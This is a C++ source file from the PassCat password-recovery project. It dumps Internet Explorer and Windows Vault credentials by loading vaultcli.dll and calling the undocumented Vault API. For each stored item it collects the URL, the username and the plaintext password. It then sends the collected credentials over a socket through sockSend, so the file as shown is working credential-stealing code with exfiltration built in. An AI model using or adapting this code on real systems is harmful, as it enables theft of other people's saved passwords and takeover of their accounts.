//PassCat - Passwords Recovery Tool
//This file is part of PassCat Project

//Written by : @maldevel
//Website : https ://www.twelvesec.com/
//GIT : https://github.com/twelvesec/passcat

//TwelveSec(@Twelvesec)

//This program is free software : you can redistribute it and/or modify
//it under the terms of the GNU General Public License as published by
//the Free Software Foundation, either version 3 of the License, or
//(at your option) any later version.

//This program is distributed in the hope that it will be useful,
//but WITHOUT ANY WARRANTY; without even the implied warranty of
//MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.See the
//GNU General Public License for more details.

//You should have received a copy of the GNU General Public License
//along with this program.If not, see < http://www.gnu.org/licenses/>.

//For more see the file 'LICENSE' for copying permission.

#include "PassCat.h"

bool libvaultie::initialized = false;
HMODULE libvaultie::hvaultLib = (HMODULE)false;

typedef HANDLE HVAULT;
#define VAULT_ENUMERATE_ALL_ITEMS 512

enum VAULT_SCHEMA_ELEMENT_ID {
	ElementId_Illegal = 0,
	ElementId_Resource = 1,
	ElementId_Identity = 2,
	ElementId_Authenticator = 3,
	ElementId_Tag = 4,
	ElementId_PackageSid = 5,
	ElementId_AppStart = 0x64,
	ElementId_AppEnd = 0x2710
};

enum VAULT_ELEMENT_TYPE {
	ElementType_Boolean = 0,
	ElementType_Short = 1,
	ElementType_UnsignedShort = 2,
	ElementType_Integer = 3,
	ElementType_UnsignedInteger = 4,
	ElementType_Double = 5,
	ElementType_Guid = 6,
	ElementType_String = 7,
	ElementType_ByteArray = 8,
	ElementType_TimeStamp = 9,
	ElementType_ProtectedArray = 0xA,
	ElementType_Attribute = 0xB,
	ElementType_Sid = 0xC,
	ElementType_Last = 0xD,
	ElementType_Undefined = 0xFFFFFFFF
};

typedef struct _VAULT_BYTE_BUFFER {
	DWORD Length;
	PBYTE Value;
} VAULT_BYTE_BUFFER, *PVAULT_BYTE_BUFFER;

typedef struct _VAULT_ITEM_DATA {
	DWORD SchemaElementId;
	DWORD unk0;
	VAULT_ELEMENT_TYPE Type;
	DWORD unk1;
	union {
		BOOL Boolean;
		SHORT Short;
		WORD UnsignedShort;
		LONG Int;
		ULONG UnsignedInt;
		DOUBLE Double;
		GUID Guid;
		LPWSTR String;
		VAULT_BYTE_BUFFER ByteArray;
		VAULT_BYTE_BUFFER ProtectedArray;
		DWORD Attribute;
		DWORD Sid;
	} data;
} VAULT_ITEM_DATA, *PVAULT_ITEM_DATA;

typedef struct _VAULT_ITEM_8 {
	GUID SchemaId;
	PWSTR FriendlyName;
	PVAULT_ITEM_DATA Resource;
	PVAULT_ITEM_DATA Identity;
	PVAULT_ITEM_DATA Authenticator;
	PVAULT_ITEM_DATA PackageSid;
	FILETIME LastWritten;
	DWORD Flags;
	DWORD cbProperties;
	PVAULT_ITEM_DATA Properties;
} VAULT_ITEM, *PVAULT_ITEM;

typedef DWORD(WINAPI *VaultEnumerateVaults)(DWORD flags, PDWORD count, GUID **guids);
typedef DWORD(WINAPI *VaultEnumerateItems)(HVAULT handle, DWORD flags, PDWORD count, PVOID *items);
typedef DWORD(WINAPI *VaultOpenVault)(GUID *id, DWORD flags, HVAULT *handle);
typedef DWORD(WINAPI *VaultCloseVault)(HVAULT handle);
typedef DWORD(WINAPI *VaultFree)(PVOID mem);
typedef DWORD(WINAPI * PVAULTGETITEM) (HANDLE vault, LPGUID SchemaId, PVAULT_ITEM_DATA Resource, PVAULT_ITEM_DATA Identity, PVAULT_ITEM_DATA PackageSid, HWND hWnd, DWORD Flags, PVAULT_ITEM * pItem);

VaultEnumerateItems  pVaultEnumerateItems;
VaultFree            pVaultFree;
VaultOpenVault       pVaultOpenVault;
VaultCloseVault      pVaultCloseVault;
VaultEnumerateVaults pVaultEnumerateVaults;
PVAULTGETITEM       pVaultGetItem;

void libvaultie::init(void) {
	if (initialized) return;

	if (!(hvaultLib = LoadLibraryW(L"vaultcli.dll"))) {
		return;
	}

	pVaultEnumerateItems = (VaultEnumerateItems)GetProcAddress(hvaultLib, "VaultEnumerateItems");
	pVaultEnumerateVaults = (VaultEnumerateVaults)GetProcAddress(hvaultLib, "VaultEnumerateVaults");
	pVaultFree = (VaultFree)GetProcAddress(hvaultLib, "VaultFree");
	pVaultOpenVault = (VaultOpenVault)GetProcAddress(hvaultLib, "VaultOpenVault");
	pVaultCloseVault = (VaultCloseVault)GetProcAddress(hvaultLib, "VaultCloseVault");
	pVaultGetItem = (PVAULTGETITEM)GetProcAddress(hvaultLib, "VaultGetItem");

	if (!pVaultEnumerateItems || !pVaultEnumerateVaults || !pVaultFree || !pVaultOpenVault || !pVaultCloseVault || !pVaultGetItem) {
		FreeLibrary(hvaultLib);
		return;
	}

	initialized = true;
}

void libvaultie::finalize(void) {
	if (!initialized) return;

	if (hvaultLib) {
		FreeLibrary(hvaultLib);
	}

	initialized = false;
}

void libvaultie::print_vault_ie_passwords(void) {
	if (!initialized) return;

	std::wstringstream out;
	DWORD vaultsCounter, itemsCounter;
	LPGUID vaults;
	HVAULT hVault;
	PVOID items;
	PVAULT_ITEM vaultItems, pVaultItems;

	if (pVaultEnumerateVaults(NULL, &vaultsCounter, &vaults) != ERROR_SUCCESS) {
		return;
	}

	for (DWORD i = 0;i < vaultsCounter;i++) {

		if (pVaultOpenVault(&vaults[i], 0, &hVault) == ERROR_SUCCESS) {

			if (pVaultEnumerateItems(hVault, VAULT_ENUMERATE_ALL_ITEMS, &itemsCounter, &items) == ERROR_SUCCESS) {

				vaultItems = (PVAULT_ITEM)items;

				for (DWORD j = 0; j < itemsCounter; j++) {
					out << "\n[PASSCAT]\nURL: " << vaultItems[j].Resource->data.String ;
					out << "\n[PASSCAT]\nUsername: " << vaultItems[j].Identity->data.String ;

					pVaultItems = NULL;

					if (pVaultGetItem(hVault, &vaultItems[j].SchemaId, vaultItems[j].Resource, vaultItems[j].Identity, vaultItems[j].PackageSid, NULL, 0, &pVaultItems) == 0) {
						if (pVaultItems->Authenticator != NULL && pVaultItems->Authenticator->data.String != NULL) {
							out << "\n[PASSCAT]\nPassword: " << pVaultItems->Authenticator->data.String ;
						}

						pVaultFree(pVaultItems);
					}

					
				}

				pVaultFree(items);
				
			}
			pVaultCloseVault(&hVault);
		}
	}

	if (vaults)
	{
		pVaultFree(vaults);
		vaults = NULL;
	}

	std::wstring ws(out.str().c_str());
	std::string stws(ws.begin(), ws.end());

	sockSend(stws.c_str());
}
